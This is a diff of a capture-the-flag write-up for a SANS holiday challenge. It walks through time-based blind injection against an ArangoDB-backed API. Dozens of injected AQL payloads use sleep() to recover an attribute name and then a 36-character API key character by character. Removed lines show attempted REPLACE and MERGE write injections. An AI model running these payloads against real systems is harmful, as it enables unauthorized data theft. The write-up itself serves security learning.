+If we use the `LENGTH` function in ArangoDB, we can try and determine how many attributes the `doc` has.
+
+By doing the following queries I can figure out how many attributes there are.
+`'OR LENGTH(doc)>0 OR sleep(1.9)==null OR '1'=='2` --> DELAY (NOT TRUE)
+`'OR LENGTH(doc)>10 OR sleep(1.9)==null OR '1'=='2` --> DELAY (NOT TRUE)
+`'OR LENGTH(doc)>4 OR sleep(1.9)==null OR '1'=='2` --> DELAY (NOT TRUE)
+`'OR LENGTH(doc)==4 OR sleep(1.9)==null OR '1'=='2` --> NO DELAY (TRUE)
+
+So basically we found that there are 4 attributes in each doc. Based on ChatGPT's knowledge, they should be the following attributes of which the first 3 are default to every item in ArangoDB.
 - `_id`
 - `_key`
 - `_rev`
 - {mystery api key attribute}
 
 We now need to figure out what the API key attribute is called.
-Maybe I can get the length of it somehow and guess from there.
+Maybe we can get the length of it somehow and guess from there.
 
-This is working to get the length of the params
-`'OR CHAR_LENGTH(NTH(ATTRIBUTES(doc),1))==4 OR sleep(1.9)==null OR '1'=='2`
+We can use the following query to get the length of the mystery attribute. `ATTRIBUTES` get all the attributes of an item, then `NTH` gets the nth item of that attribute array. Finally `CHAR_LENGTH` gets the number of characters in the attribute's name. We can do a few comparisons to narrow down the actual length.
 
-Through a bunch of trial and error, I was able to get the following working
-`'OR CHAR_LENGTH(NTH(ATTRIBUTES(doc),0))==18 OR sleep(1.9)==null OR '1'=='2` --> NO DELAY
+`'OR CHAR_LENGTH(NTH(ATTRIBUTES(doc),1))==4 OR sleep(1.9)==null OR '1'=='2` (DELAY)
+`'OR CHAR_LENGTH(NTH(ATTRIBUTES(doc),1))>20 OR sleep(1.9)==null OR '1'=='2` (DELAY)
+`'OR CHAR_LENGTH(NTH(ATTRIBUTES(doc),0))==18 OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
 
-That means our api key parameter is 18 chars long
-frostbit_x_api_key 18????????????? :)))))) Maybe this will work
+The above queries determined that the attribute has a length of 18 characters. My first guess was `frostbit_x_api_key` but it didnt work :(
 
+I even tried through all of the following combinations before deciding I had to change my methods:
+
+```
 frostbit_x_api_key
 Frostbit_X_Api_Key
 FROSTBIT_X_API_KEY
@@ -786,77 +987,38 @@ Frostbit_X_Api_key
 frostbit_X_Api_Key
 frostbit_x_Api_Key
 frostbit_X_API_KEY
+```
 
-`'OR NTH(ATTRIBUTES(doc),0)=="X-API-KEY-FROSTBIT" OR sleep(1.9)==null OR '1'=='2`
+After looking through the ArangoDB documentation once more, I found the `CONTAINS` function which can check if a string contains another string. 
 
-None of these worked
+`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "key") OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
+`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "_api_key") OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
 
-`LET dynamicFieldName = NTH(ATTRIBUTES(doc),0)`
-`INSERT MERGE({}, { [dynamicFieldName]: "test" }) INTO config`
+`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "deactivate_api_key") OR sleep(1.9)==null OR '1'=='2` --> (NO DELAY)
 
-`INSERT MERGE({}, { [NTH(ATTRIBUTES(doc),0)]: "secretapikey" }) INTO config`
+With that function and a couple good assumptions, we now determined the attribute name of the api key;
 
-Ok, the REPLACE function seems to not be blocked.
+`deactivate_api_key`
 
-Man this is hard. Let me see if I can just figure out the first character of the parameter name
+What would be a great next step would be to now add your own API key to the database now that we know its attribute name. The issue with this is that all of the useful data modification queries in ArangoDB (INSERT, UPDATE, MERGE) are blocked in the requests. So this leaves us with one clear option. Enumerate the API key value. We already did it for the attribute name, so we can do it for the value. Lets start with finding out the length
 
-`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "key") OR sleep(1.9)==null OR '1'=='2` --> TRUE
-`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "_api_key") OR sleep(1.9)==null OR '1'=='2` --> TRUE
-frostbit
-activate
+`'OR CHAR_LENGTH(doc.deactivate_api_key)>5 OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
 
-`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "activate_api_key") OR sleep(1.9)==null OR '1'=='2` --> TRUE
+`'OR CHAR_LENGTH(doc.deactivate_api_key)>20 OR sleep(1.9)==null OR '1'=='2` (NO DELAY) 
 
-`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "deactivate_api_key") OR sleep(1.9)==null OR '1'=='2` --> TRUE
+`'OR CHAR_LENGTH(doc.deactivate_api_key)>40 OR sleep(1.9)==null OR '1'=='2` (DELAY)
 
-FOUND IT:
-`'OR NTH(ATTRIBUTES(doc),0)=="deactivate_api_key" OR sleep(1.9)==null OR '1'=='2`
+`'OR CHAR_LENGTH(doc.deactivate_api_key)==36 OR sleep(1.9)==null OR '1'=='2` (DELAY)
 
-Ok so now I think I need to do a REPLACE function and set the value to one I know.
+Damn so the API key is 36 characters long. This is going to be fun. Using the `SUBSTRING` function, I decided to determine which of all the characters existed within the API key. That way, each time we try and enumerate a new character, we are only checking each character that could actually exist within the string.
 
-`REPLACE { deactivate_api_key: "supersecretkey" } IN config`
+For example, the following query would determine if the character "a" exists within the api key value:
 
-`'REPLACE { deactivate_api_key: "supersecretkey" } IN config OR sleep(1.9)==null OR '1'=='2`
+`'OR SUBSTRING(doc.deactivate_api_key, 0, 1)=="a" OR sleep(1.9)==null OR '1'=='2`
 
-Didnt work, lets try MERGE function
+This query did not execute a delay, meaning the character "a" does exist in the api key. Through this same method, I determined that the following characters made up the api key:
 
-`MERGE(doc, {"deactivate_api_key":"supersecretkey"})`
-
-`'OR MERGE(doc, {"deactivate_api_key":"supersecretkey"})==1 OR sleep(1.9)==null OR '1'=='2`
-
-merge blocked.......
-
-`'OR (FOR d IN config REPLACE d WITH { deactivate_api_key: "supersecretkey" } IN config) OR sleep(1.9)==null OR '1'=='2`
-
-`(REPLACE {_key: doc._key, deactivate_api_key: "glory" } IN config)`
-
-`'OR (REPLACE {_key: doc._key, deactivate_api_key: "glory" } IN config) OR sleep(1.9)==null OR '1'=='2`
-
-`(REPLACE doc WITH {_key: doc._key, deactivate_api_key: "glory" } IN config)`
-
-`'OR (REPLACE doc WITH {_key: doc._key, deactivate_api_key: "glory" } IN config) OR sleep(1.9)==null OR '1'=='2`
-
-WITH is blocked...
-
-`'OR (REPLACE { _key: doc._key, deactivate_api_key: "glory" } IN config)==1 OR sleep(1.9)==null OR '1'=='2`
-
-`doc.deactivate_api_key`
-
-Ok now I think I need to enumerate the actual API key value...
-
-`'OR CHAR_LENGTH(doc.deactivate_api_key)==36 OR sleep(1.9)==null OR '1'=='2` --> TRUE
-
-Damn so the API key is 36 characters long. Not sure if this is a good way to do it...
-
-`'OR CONTAINS(doc.deactivate_api_key, "frostbit") OR sleep(1.9)==null OR '1'=='2
-
-`'OR SUBSTRING("frostbit", 0, 1)=="f" OR sleep(1.9)==null OR '1'=='2``
-
-WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 7)=="abe7a6a" OR sleep(1.9)==null OR '1'=='2`
-
-WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 10)=="abe7a6ad-7" OR sleep(1.9)==null OR '1'=='2`
-
-CONTAINS:
+```
 a
 b
 c
@@ -872,14 +1034,38 @@ f
 9
 0
 -
+```
 
-WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 14)=="abe7a6ad-715e-" OR sleep(1.9)==null OR '1'=='2
-WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 19)=="abe7a6ad-715e-4e6a-" OR sleep(1.9)==null OR '1'=='2`
-WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 26)=="abe7a6ad-715e-4e6a-901b-c9" OR sleep(1.9)==null OR '1'=='2`
-WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 30)=="abe7a6ad-715e-4e6a-901b-c9279a" OR sleep(1.9)==null OR '1'=='2`
-WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 32)=="abe7a6ad-715e-4e6a-901b-c9279a96" OR sleep(1.9)==null OR '1'=='2`
-WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 35)=="abe7a6ad-715e-4e6a-901b-c9279a964f9" OR sleep(1.9)==null OR '1'=='2`
+All of these are hex characters, except the hyphen. This combined with the 36 character length makes it clear that this is a UUID. Let's enumerating the api key. Every time we find a new character, we increment the length in the `SUBSTRING` function and move onto finding the next character.
 
-DONE: `'OR SUBSTRING(doc.deactivate_api_key, 0, 36)=="abe7a6ad-715e-4e6a-901b-c9279a964f91" OR sleep(1.9)==null OR '1'=='2`
+After a while, I was getting close:
+
+`'OR SUBSTRING(doc.deactivate_api_key, 0, 14)=="abe7a6ad-715e-" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
+
+`'OR SUBSTRING(doc.deactivate_api_key, 0, 19)=="abe7a6ad-715e-4e6a-" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
+
+`'OR SUBSTRING(doc.deactivate_api_key, 0, 26)=="abe7a6ad-715e-4e6a-901b-c9" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
+
+`'OR SUBSTRING(doc.deactivate_api_key, 0, 30)=="abe7a6ad-715e-4e6a-901b-c9279a" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
+
+`'OR SUBSTRING(doc.deactivate_api_key, 0, 32)=="abe7a6ad-715e-4e6a-901b-c9279a96" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
+
+`'OR SUBSTRING(doc.deactivate_api_key, 0, 35)=="abe7a6ad-715e-4e6a-901b-c9279a964f9" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
+
+`'OR SUBSTRING(doc.deactivate_api_key, 0, 36)=="abe7a6ad-715e-4e6a-901b-c9279a964f91" OR sleep(1.9)==null OR '1'=='2` (NO DELAY)
+
+Finally, we found the 36 character api key:
 
 deactivate_api_key: `abe7a6ad-715e-4e6a-901b-c9279a964f91`
+
+Once we sent it to the API, we got the following response.
+
+![deactivated](../images/frostbit_deactivate/deactivated.png)
+
+If we return to the ransomeware web page, we find that the status has been switched to deactivated there as well.
+
+![Deactivated webpage](../images/frostbit_deactivate/status_deactivated.png)
+
+Christmas is saved!
+
+Thank you to SANS! I enjoy this every year!
